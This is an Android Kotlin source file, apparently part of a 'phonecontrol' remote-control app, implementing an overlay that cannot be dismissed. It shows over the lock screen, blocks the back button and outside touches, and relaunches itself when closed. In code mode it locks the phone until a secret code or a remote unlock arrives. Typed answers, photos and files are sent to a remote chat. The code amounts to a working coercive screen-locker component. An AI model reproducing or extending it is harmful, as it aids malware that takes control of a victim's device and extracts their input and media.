package com.phonecontrol

import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.*
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.util.TypedValue
import android.view.*
import android.view.animation.DecelerateInterpolator
import android.view.animation.CycleInterpolator
import android.widget.*
import kotlinx.coroutines.*

/**
 * Универсальный оверлей с системой приоритетов:
 *  Приоритет 0 — mode = "code"   — блокировка кодом, не всплывает если активен msg/video
 *  Приоритет 1 — mode = "plain" / "reply" / "survey"
 *  Приоритет 2 — VideoActivity (управляет OverlayPriorityManager сам)
 */
class OverlayActivity : Activity() {

    private lateinit var cardView: LinearLayout
    private lateinit var titleView: TextView
    private lateinit var subtitleView: TextView
    private lateinit var inputLayout: LinearLayout
    private lateinit var inputField: EditText
    private lateinit var actionBtn: Button
    private lateinit var progressView: TextView
    private lateinit var fileButtonsLayout: LinearLayout

    private var mode            = "plain"
    private var replyPrompt     = "✏️ Напиши ответ:"
    private var questions       = arrayListOf<String>()
    private var answers         = arrayListOf<String>()
    private var currentQuestion = 0
    private var originalText    = ""
    private var uploadChatId    = ""
    private var done            = false

    // code mode
    private var codeSecret         = ""
    private var allowMedia         = false
    private var codeWaitingConfirm = false
    private var codeUnlockReceiver: BroadcastReceiver? = null

    private val handler = Handler(Looper.getMainLooper())

    companion object {
        const val PRIORITY_CODE  = 0
        const val PRIORITY_MSG   = 1
        const val PRIORITY_VIDEO = 2

        const val ACTION_CODE_UNLOCK = "com.phonecontrol.CODE_UNLOCK"
        const val ACTION_CODE_DENIED = "com.phonecontrol.CODE_DENIED"

        fun start(
            context: Context,
            message: String,
            fbMode: String = "plain",
            replyPrompt: String = "✏️ Напиши ответ:",
            survey: List<String> = emptyList(),
            chatId: String = "",
            answersProgress: ArrayList<String> = arrayListOf(),
            currentQ: Int = 0,
            codeSecret: String = "",
            allowMedia: Boolean = false,
        ) {
            context.startActivity(Intent(context, OverlayActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK
                putExtra("message",      message)
                putExtra("fb_mode",      fbMode)
                putExtra("reply_prompt", replyPrompt)
                putStringArrayListExtra("survey", ArrayList(survey))
                putExtra("chat_id",      chatId)
                putStringArrayListExtra("answers_progress", answersProgress)
                putExtra("current_q",    currentQ)
                putExtra("code_secret",  codeSecret)
                putExtra("allow_media",  allowMedia)
            })
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.setFlags(WindowManager.LayoutParams.FLAG_SECURE,
            WindowManager.LayoutParams.FLAG_SECURE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true); setTurnScreenOn(true)
        }
        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        )
        buildUI()
        applyIntent(intent)
        hideSystemUI()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        intent?.let { applyIntent(it) }
    }

    override fun onResume() {
        super.onResume()
        val priority = if (mode == "code") PRIORITY_CODE else PRIORITY_MSG
        OverlayPriorityManager.setActive(priority)
    }

    override fun onStop() {
        super.onStop()

        val priority = if (mode == "code") PRIORITY_CODE else PRIORITY_MSG

        if (done) {
            OverlayPriorityManager.clearActive(priority)
            finishAndRemoveTask()
            return
        }

        finishAndRemoveTask()

        when (mode) {
            "reply", "survey" -> {
                OverlayPriorityManager.clearActive(PRIORITY_MSG)
                handler.postDelayed({
                    start(applicationContext, originalText, mode, replyPrompt,
                        questions, uploadChatId, answers, currentQuestion)
                }, 400L)
            }
            "code" -> {
                OverlayPriorityManager.clearActive(PRIORITY_CODE)
                handler.postDelayed({
                    if (!OverlayPriorityManager.isHigherActive(PRIORITY_CODE)) {
                        // Никого выше нет — всплываем
                        start(applicationContext, originalText, "code",
                            chatId = uploadChatId,
                            codeSecret = codeSecret, allowMedia = allowMedia)
                    } else {
                        // msg или video активны — регистрируем отложенный перезапуск
                        OverlayPriorityManager.scheduleCodeReopen(
                            applicationContext, originalText,
                            uploadChatId, codeSecret, allowMedia)
                    }
                }, 400L)
            }
            // plain — не перезапускаем
        }
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        unregisterCodeReceiver()
        super.onDestroy()
    }

    override fun onBackPressed() { /* заблокировано */ }

    override fun dispatchTouchEvent(ev: MotionEvent): Boolean {
        if (!done) {
            val loc = IntArray(2)
            cardView.getLocationOnScreen(loc)
            val inCard = ev.rawX >= loc[0] && ev.rawX <= loc[0] + cardView.width &&
                         ev.rawY >= loc[1] && ev.rawY <= loc[1] + cardView.height
            return if (inCard) super.dispatchTouchEvent(ev) else true
        }
        return super.dispatchTouchEvent(ev)
    }

    private fun hideSystemUI() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.insetsController?.let {
                it.hide(android.view.WindowInsets.Type.systemBars() or
                        android.view.WindowInsets.Type.navigationBars())
                it.systemBarsBehavior =
                    android.view.WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            }
        } else {
            @Suppress("DEPRECATION")
            window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or View.SYSTEM_UI_FLAG_FULLSCREEN or
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            )
        }
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) hideSystemUI()
    }

    // ── Intent → State ────────────────────────────────────────────────────────

    private fun applyIntent(i: Intent) {
        originalText    = i.getStringExtra("message") ?: "⚠️ Сообщение"
        mode            = i.getStringExtra("fb_mode") ?: "plain"
        replyPrompt     = i.getStringExtra("reply_prompt") ?: "✏️ Напиши ответ:"
        questions       = i.getStringArrayListExtra("survey") ?: arrayListOf()
        uploadChatId    = i.getStringExtra("chat_id") ?: ""
        answers         = i.getStringArrayListExtra("answers_progress") ?: arrayListOf()
        currentQuestion = i.getIntExtra("current_q", 0)
        codeSecret      = i.getStringExtra("code_secret") ?: ""
        allowMedia      = i.getBooleanExtra("allow_media", false)
        done            = false
        codeWaitingConfirm = false
        applyMode()
    }

    private fun applyMode() {
        titleView.text = originalText
        actionBtn.visibility = View.VISIBLE

        when (mode) {
            "plain" -> {
                subtitleView.visibility = View.GONE
                inputLayout.visibility  = View.GONE
                progressView.visibility = View.GONE
                actionBtn.text = "ОК"
                actionBtn.setOnClickListener { done = true; finishAndRemoveTask() }
            }
            "reply" -> {
                subtitleView.text       = replyPrompt
                subtitleView.visibility = View.VISIBLE
                inputLayout.visibility  = View.VISIBLE
                progressView.visibility = View.GONE
                inputField.hint = "Введи ответ..."
                inputField.inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_FLAG_MULTI_LINE
                actionBtn.text  = "Отправить"
                actionBtn.setOnClickListener { submitReply() }
            }
            "survey" -> {
                if (questions.isEmpty()) { finishAndRemoveTask(); return }
                inputLayout.visibility = View.VISIBLE
                showQuestion(currentQuestion)
            }
            "code" -> applyCodeMode()
        }
    }

    // ── Code mode ─────────────────────────────────────────────────────────────

    private fun applyCodeMode() {
        subtitleView.text       = "🔒 Для продолжения введи код"
        subtitleView.visibility = View.VISIBLE
        progressView.visibility = View.GONE
        inputLayout.visibility  = View.VISIBLE

        inputField.hint      = "Введи код..."
        inputField.inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
        inputField.setText("")
        inputField.minLines  = 1
        inputField.maxLines  = 1

        actionBtn.text = "Подтвердить"
        actionBtn.setOnClickListener { checkCode() }

        if (allowMedia) {
            fileButtonsLayout.visibility = View.VISIBLE
            setupCodeMediaButtons()
        }

        registerCodeReceiver()
    }

    private fun checkCode() {
        val input = inputField.text.toString().trim()
        if (input == codeSecret) {
            done = true
            OverlayPriorityManager.clearActive(PRIORITY_CODE)
            OverlayPriorityManager.cancelCodeReopen()
            unregisterCodeReceiver()
            showDone("✅ Код принят!")
        } else {
            shakeCard()
            inputField.setText("")
            subtitleView.text = "❌ Неверный код, попробуй ещё"
        }
    }

    private fun shakeCard() {
        val shake = android.view.animation.TranslateAnimation(0f, 18f, 0f, 0f).apply {
            duration     = 400
            interpolator = CycleInterpolator(4f)
        }
        cardView.startAnimation(shake)
    }

    private fun setupCodeMediaButtons() {
        fileButtonsLayout.removeAllViews()

        val btnCamera = Button(this).apply {
            text      = "📷 Отправить фото"
            textSize  = 13f
            setTextColor(Color.WHITE)
            background = fileButtonBg()
            isAllCaps  = false
            setOnClickListener {
                if (!codeWaitingConfirm) {
                    codeWaitingConfirm = true
                    showCodeWaiting()
                    FilePickerActivity.startCameraForCode(this@OverlayActivity, uploadChatId)
                }
            }
        }
        val btnGallery = Button(this).apply {
            text      = "🖼 Отправить файл"
            textSize  = 13f
            setTextColor(Color.WHITE)
            background = fileButtonBg()
            isAllCaps  = false
            setOnClickListener {
                if (!codeWaitingConfirm) {
                    codeWaitingConfirm = true
                    showCodeWaiting()
                    FilePickerActivity.startGalleryForCode(this@OverlayActivity, uploadChatId)
                }
            }
        }
        val halfLp = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
            .also { it.marginEnd = dp(8) }
        fileButtonsLayout.addView(btnCamera, halfLp)
        fileButtonsLayout.addView(btnGallery,
            LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f))
    }

    private fun showCodeWaiting() {
        subtitleView.text            = "⏳ Файл отправлен. Ожидаем подтверждения..."
        inputLayout.visibility       = View.GONE
        actionBtn.visibility         = View.GONE
        fileButtonsLayout.visibility = View.GONE
    }

    private fun registerCodeReceiver() {
        if (codeUnlockReceiver != null) return
        codeUnlockReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context?, intent: Intent?) {
                when (intent?.action) {
                    ACTION_CODE_UNLOCK -> {
                        done = true
                        OverlayPriorityManager.clearActive(PRIORITY_CODE)
                        OverlayPriorityManager.cancelCodeReopen()
                        unregisterCodeReceiver()
                        showDone("✅ Подтверждено!")
                    }
                    ACTION_CODE_DENIED -> {
                        codeWaitingConfirm = false
                        subtitleView.text = "❌ Отклонено. Попробуй ещё раз"
                        inputLayout.visibility       = View.VISIBLE
                        actionBtn.visibility         = View.VISIBLE
                        if (allowMedia) fileButtonsLayout.visibility = View.VISIBLE
                        shakeCard()
                    }
                }
            }
        }
        val filter = IntentFilter().apply {
            addAction(ACTION_CODE_UNLOCK); addAction(ACTION_CODE_DENIED)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(codeUnlockReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(codeUnlockReceiver, filter)
        }
    }

    private fun unregisterCodeReceiver() {
        codeUnlockReceiver?.let { try { unregisterReceiver(it) } catch (_: Exception) {} }
        codeUnlockReceiver = null
    }

    // ── Survey ────────────────────────────────────────────────────────────────

    private fun showQuestion(idx: Int) {
        if (idx >= questions.size) { submitSurvey(); return }
        currentQuestion         = idx
        subtitleView.text       = questions[idx]
        subtitleView.visibility = View.VISIBLE
        inputField.setText("")
        inputField.hint = "Введи ответ..."

        actionBtn.text = if (idx == questions.size - 1) "Готово ✓" else "Далее →"
        progressView.text       = "${idx + 1} / ${questions.size}"
        progressView.visibility = View.VISIBLE

        actionBtn.setOnClickListener {
            val ans = inputField.text.toString().trim()
            if (ans.length < 3) { inputField.error = "Минимум 3 символа"; return@setOnClickListener }
            if (idx < answers.size) answers[idx] = ans else answers.add(ans)
            showQuestion(idx + 1)
        }
    }

    // ── Submit ────────────────────────────────────────────────────────────────

    private fun submitReply() {
        val answer = inputField.text.toString().trim()
        if (answer.length < 3) { inputField.error = "Минимум 3 символа"; return }
        done = true
        CoroutineScope(Dispatchers.IO).launch {
            Uploader.sendText(this@OverlayActivity, "💬 Ответ: $answer", uploadChatId)
        }
        showDone("✅ Ответ отправлен!")
    }

    private fun submitSurvey() {
        done = true
        val sb = StringBuilder("📋 *Ответы на опросник:*\n\n")
        questions.forEachIndexed { i, q ->
            sb.append("*${i + 1}. $q*\n${answers.getOrElse(i) { "—" }}\n\n")
        }
        CoroutineScope(Dispatchers.IO).launch {
            Uploader.sendText(this@OverlayActivity, sb.toString(), uploadChatId)
        }
        showDone("✅ Ответы отправлены!")
    }

    private fun showDone(msg: String) {
        titleView.text               = msg
        subtitleView.visibility      = View.GONE
        inputLayout.visibility       = View.GONE
        progressView.visibility      = View.GONE
        fileButtonsLayout.visibility = View.GONE
        actionBtn.visibility         = View.VISIBLE
        actionBtn.text               = "ОК"
        actionBtn.setOnClickListener { done = true; finishAndRemoveTask() }
    }

    // ── UI Builder ────────────────────────────────────────────────────────────

    private fun buildUI() {
        val root = android.widget.FrameLayout(this).apply {
            background = GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(0xCC000000.toInt(), 0xEE0A0A1A.toInt()))
        }

        cardView = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity     = android.view.Gravity.CENTER_HORIZONTAL
            background  = cardBackground()
            elevation   = dp(16f).toFloat()
            setPadding(dp(28), dp(32), dp(28), dp(28))
        }

        titleView = TextView(this).apply {
            textSize = 26f; setTextColor(Color.WHITE)
            gravity  = android.view.Gravity.CENTER
            typeface = Typeface.DEFAULT_BOLD; letterSpacing = 0.02f
            setPadding(0, 0, 0, dp(8))
        }
        subtitleView = TextView(this).apply {
            textSize = 15f; setTextColor(0xFFCCCCCC.toInt())
            gravity  = android.view.Gravity.CENTER
            setPadding(0, 0, 0, dp(16)); visibility = View.GONE
        }
        progressView = TextView(this).apply {
            textSize = 13f; setTextColor(0xFF8888AA.toInt())
            gravity  = android.view.Gravity.CENTER
            setPadding(0, 0, 0, dp(8)); visibility = View.GONE
        }

        inputLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility  = View.GONE; setPadding(0, 0, 0, dp(16))
        }
        inputField = EditText(this).apply {
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_FLAG_MULTI_LINE
            minLines = 2; maxLines = 5
            setTextColor(Color.WHITE); setHintTextColor(0xFF666688.toInt())
            background = inputBackground(); setPadding(dp(14), dp(12), dp(14), dp(12))
            textSize = 15f
        }
        inputLayout.addView(inputField, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT))

        actionBtn = Button(this).apply {
            textSize = 16f; setTextColor(Color.WHITE)
            background = buttonBackground(); setPadding(dp(24), dp(14), dp(24), dp(14))
            isAllCaps = false; letterSpacing = 0.04f
            typeface = Typeface.DEFAULT_BOLD; stateListAnimator = null
        }

        val divider = View(this).apply {
            setBackgroundColor(0x33FFFFFF)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 1).also { it.bottomMargin = dp(20) }
        }

        fileButtonsLayout = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            visibility  = View.GONE; setPadding(0, dp(12), 0, 0)
        }
        val btnCam = Button(this).apply {
            text = "📷 Камера"; textSize = 14f; setTextColor(Color.WHITE)
            background = fileButtonBg(); isAllCaps = false
            setOnClickListener { FilePickerActivity.startCamera(this@OverlayActivity, uploadChatId) }
        }
        val btnGal = Button(this).apply {
            text = "🖼 Галерея"; textSize = 14f; setTextColor(Color.WHITE)
            background = fileButtonBg(); isAllCaps = false
            setOnClickListener { FilePickerActivity.startGallery(this@OverlayActivity, uploadChatId) }
        }
        val halfLp = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
            .also { it.marginEnd = dp(8) }
        fileButtonsLayout.addView(btnCam, halfLp)
        fileButtonsLayout.addView(btnGal, LinearLayout.LayoutParams(
            0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f))

        fun lp() = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)

        cardView.addView(titleView, lp()); cardView.addView(subtitleView, lp())
        cardView.addView(progressView, lp()); cardView.addView(divider)
        cardView.addView(inputLayout, lp()); cardView.addView(actionBtn, lp())
        cardView.addView(fileButtonsLayout, lp())

        root.addView(cardView, android.widget.FrameLayout.LayoutParams(
            (resources.displayMetrics.widthPixels * 0.88).toInt(),
            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT
        ).also { it.gravity = android.view.Gravity.CENTER })

        setContentView(root)

        cardView.alpha = 0f; cardView.translationY = dp(40).toFloat()
        cardView.animate().alpha(1f).translationY(0f)
            .setDuration(350).setInterpolator(DecelerateInterpolator(2f)).start()
    }

    private fun cardBackground() = GradientDrawable(GradientDrawable.Orientation.TL_BR,
        intArrayOf(0xFF1A1A2E.toInt(), 0xFF16213E.toInt(), 0xFF0F3460.toInt())
    ).apply { cornerRadius = dp(20).toFloat(); setStroke(dp(1), 0x33FFFFFF) }

    private fun inputBackground() = GradientDrawable().apply {
        setColor(0xFF0D1117.toInt()); cornerRadius = dp(12).toFloat()
        setStroke(dp(1), 0x446666AA)
    }
    private fun buttonBackground() = GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT,
        intArrayOf(0xFF4F46E5.toInt(), 0xFF7C3AED.toInt())
    ).apply { cornerRadius = dp(14).toFloat() }

    private fun fileButtonBg() = GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT,
        intArrayOf(0xFF1A1A2E.toInt(), 0xFF0F3460.toInt())
    ).apply { cornerRadius = dp(12).toFloat(); setStroke(dp(1), 0x44FFFFFF) }

    private fun dp(value: Float) =
        TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, value, resources.displayMetrics).toInt()
    private fun dp(value: Int) = dp(value.toFloat())
}
